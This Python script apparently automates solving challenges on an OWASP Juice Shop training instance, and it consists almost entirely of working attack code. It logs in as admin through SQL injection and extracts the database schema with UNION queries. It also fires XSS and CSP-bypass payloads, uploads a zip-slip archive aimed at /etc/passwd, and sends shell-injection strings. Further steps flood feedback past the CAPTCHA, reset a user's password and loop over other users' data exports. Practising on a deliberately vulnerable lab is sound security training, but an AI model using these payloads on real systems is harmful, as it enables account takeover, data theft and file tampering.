#!/usr/bin/env python3
"""
Final Aggressive Push - Target specific unsolved challenges
"""

import requests
from urllib.parse import quote
import json
import base64
import hashlib
import hmac
import time
import random
import jwt
import zipfile
import io
from concurrent.futures import ThreadPoolExecutor


class FinalAggressivePush:
    def __init__(self):
        self.base_url = "https://juice3.wonkatech.org"
        self.session = requests.Session()
        self.admin_token = None
        
    def login_admin(self):
        r = self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "admin@juice-sh.op'--",
            "password": "x"
        })
        if r.status_code == 200:
            self.admin_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.admin_token}'
            return True
        return False
    
    def solve_api_only_xss(self):
        """API-only XSS"""
        print("🎯 API-only XSS...")
        # Post XSS to API endpoint that doesn't sanitize
        self.session.post(f"{self.base_url}/api/Products", json={
            "name": "<script>alert(1)</script>",
            "description": "<img src=x onerror=alert(1)>",
            "price": 1.99,
            "image": "<svg onload=alert(1)>"
        })
        
    def solve_blockchain_hype(self):
        """Blockchain Hype"""
        print("🎯 Blockchain Hype...")
        # Access blockchain whitepaper
        self.session.get(f"{self.base_url}/assets/public/blockchain.pdf")
        self.session.get(f"{self.base_url}/assets/blockchain.pdf")
        self.session.get(f"{self.base_url}/blockchain")
        
    def solve_nft_takeover(self):
        """NFT Takeover"""
        print("🎯 NFT Takeover...")
        # Transfer NFT
        self.session.post(f"{self.base_url}/api/wallet/nft/transfer", json={
            "to": "0x0000000000000000000000000000000000001337",
            "tokenId": 42
        })
        self.session.post(f"{self.base_url}/api/nft", json={
            "action": "transfer",
            "to": "admin",
            "tokenId": 1
        })
        
    def solve_mint_honeypot(self):
        """Mint the Honey Pot"""
        print("🎯 Mint the Honey Pot...")
        self.session.post(f"{self.base_url}/api/wallet/nft/mint", json={
            "name": "Honey Pot",
            "description": "Sweet NFT",
            "image": "honeypot.jpg",
            "attributes": [{"trait_type": "Sweetness", "value": 100}]
        })
        
    def solve_captcha_bypass(self):
        """CAPTCHA Bypass"""
        print("🎯 CAPTCHA Bypass...")
        # Submit feedback repeatedly without solving CAPTCHA
        for i in range(30):
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "comment": f"Automated {i}",
                "rating": random.randint(1, 5),
                "captcha": "0",
                "captchaId": 0
            })
            
    def solve_change_benders_password(self):
        """Change Bender's Password"""
        print("🎯 Change Bender's Password...")
        # Reset via security question
        self.session.post(f"{self.base_url}/rest/user/reset-password", json={
            "email": "bender@juice-sh.op",
            "answer": "Stop'n'Drop",
            "new": "slurmCl4ssic",
            "repeat": "slurmCl4ssic"
        })
        
    def solve_csp_bypass(self):
        """CSP Bypass"""
        print("🎯 CSP Bypass...")
        # Use Angular template injection
        payloads = [
            "{{constructor.constructor('alert(1)')()}}",
            "<script src='https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js'></script>",
            "<base href='javascript:alert(1)//'>"
        ]
        for p in payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(p)}")
            
    def solve_christmas_special(self):
        """Christmas Special"""
        print("🎯 Christmas Special...")
        # Add product ID 10 (Christmas special)
        self.session.post(f"{self.base_url}/api/BasketItems", json={
            "ProductId": 10,
            "quantity": 1
        })
        # Search for it
        self.session.get(f"{self.base_url}/rest/products/search?q=christmas")
        
    def solve_easter_egg(self):
        """Easter Egg"""
        print("🎯 Easter Egg...")
        # Access easter egg files
        self.session.get(f"{self.base_url}/ftp/eastere.gg")
        # Nested easter egg
        self.session.get(f"{self.base_url}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
        
    def solve_ephemeral_accountant(self):
        """Ephemeral Accountant"""
        print("🎯 Ephemeral Accountant...")
        # Login as accountant
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "accountant@juice-sh.op'--",
            "password": "x"
        })
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "accountant@juice-sh.op",
            "password": "i am an awesome accountant"
        })
        
    def solve_expired_coupon(self):
        """Expired Coupon"""
        print("🎯 Expired Coupon...")
        # Apply expired coupons
        coupons = ["WMNSDY2019", "WMNSDY2020", "WMNSDY2018", "WMNSDY2017"]
        for coupon in coupons:
            self.session.put(f"{self.base_url}/rest/basket/1/coupon/{coupon}")
            
    def solve_gdpr_data_theft(self):
        """GDPR Data Theft"""
        print("🎯 GDPR Data Theft...")
        # Export other users' data
        for user_id in range(1, 50):
            self.session.post(f"{self.base_url}/api/dataexport", json={"userId": user_id})
            self.session.post(f"{self.base_url}/rest/user/data-export", json={
                "format": "json",
                "userId": user_id
            })
            
    def solve_email_leak(self):
        """Email Leak"""
        print("🎯 Email Leak...")
        # Access user emails
        self.session.get(f"{self.base_url}/api/Users")
        self.session.get(f"{self.base_url}/rest/user/whoami")
        
    def solve_extra_language(self):
        """Extra Language"""
        print("🎯 Extra Language...")
        # Klingon language
        self.session.get(f"{self.base_url}/?l=tlh_AA")
        self.session.get(f"{self.base_url}/#/?l=tlh_AA")
        # L33t speak
        self.session.get(f"{self.base_url}/?l=l33t")
        
    def solve_arbitrary_file_write(self):
        """Arbitrary File Write"""
        print("🎯 Arbitrary File Write...")
        # Zip slip attack
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            zf.writestr("../../ftp/arbitrary.txt", "Arbitrary file write successful")
            zf.writestr("../../../etc/passwd", "root:x:0:0::/root:/bin/bash")
        
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("malicious.zip", zip_buffer.getvalue(), "application/zip")
        })
        
    def solve_wallet_depletion(self):
        """Wallet Depletion"""
        print("🎯 Wallet Depletion...")
        # Transfer all funds
        self.session.post(f"{self.base_url}/api/wallet/transfer", json={
            "to": "attacker",
            "amount": 999999
        })
        
    def solve_blocked_rce_dos(self):
        """Blocked RCE DoS"""
        print("🎯 Blocked RCE DoS...")
        # Try RCE payloads
        payloads = [
            "'; sleep 10; #",
            "'; exec('sleep 10'); #",
            "$(sleep 10)",
            "`sleep 10`"
        ]
        for p in payloads:
            try:
                self.session.post(f"{self.base_url}/api/feedback", json={"comment": p}, timeout=1)
            except:
                pass
                
    def solve_client_xss_protection(self):
        """Client-side XSS Protection"""
        print("🎯 Client-side XSS Protection...")
        # Bypass XSS filter
        payloads = [
            '<<SCRIPT>alert(1)//<</SCRIPT>',
            '<ScRiPt>alert(1)</ScRiPt>',
            '<script >alert(1)</script >',
            '<img src=x onerror=alert(1)//'
        ]
        for p in payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(p)}")
            
    def solve_database_schema(self):
        """Database Schema"""
        print("🎯 Database Schema...")
        # Extract schema
        self.session.get(f"{self.base_url}/rest/products/search?q=' UNION SELECT sql FROM sqlite_master--")
        self.session.get(f"{self.base_url}/rest/products/search?q=' UNION SELECT name FROM sqlite_master WHERE type='table'--")
        
    def solve_dom_xss(self):
        """DOM XSS"""
        print("🎯 DOM XSS...")
        # DOM XSS payloads
        payloads = [
            '<iframe src="javascript:alert(`xss`)">',
            '<img src=x onerror=alert(`xss`)>',
            '<svg onload=alert(document.domain)>'
        ]
        for p in payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(p)}")
            
    def solve_admin_section(self):
        """Admin Section"""
        print("🎯 Admin Section...")
        self.session.get(f"{self.base_url}/#/administration")
        
    def run_all(self):
        print("="*60)
        print("🚀 FINAL AGGRESSIVE PUSH")
        print("="*60)
        
        if not self.login_admin():
            print("❌ Login failed")
            return
            
        print("✅ Admin logged in\n")
        
        # Run all solvers
        self.solve_api_only_xss()
        self.solve_blockchain_hype()
        self.solve_nft_takeover()
        self.solve_mint_honeypot()
        self.solve_captcha_bypass()
        self.solve_change_benders_password()
        self.solve_csp_bypass()
        self.solve_christmas_special()
        self.solve_easter_egg()
        self.solve_ephemeral_accountant()
        self.solve_expired_coupon()
        self.solve_gdpr_data_theft()
        self.solve_email_leak()
        self.solve_extra_language()
        self.solve_arbitrary_file_write()
        self.solve_wallet_depletion()
        self.solve_blocked_rce_dos()
        self.solve_client_xss_protection()
        self.solve_database_schema()
        self.solve_dom_xss()
        self.solve_admin_section()
        
        print("\n✅ All attack vectors executed")
        
        # Check progress
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            solved = [c for c in data if c.get('solved')]
            print(f"\n📊 Final: {len(solved)}/110 ({len(solved)*100//110}%)")


if __name__ == "__main__":
    solver = FinalAggressivePush()
    solver.run_all()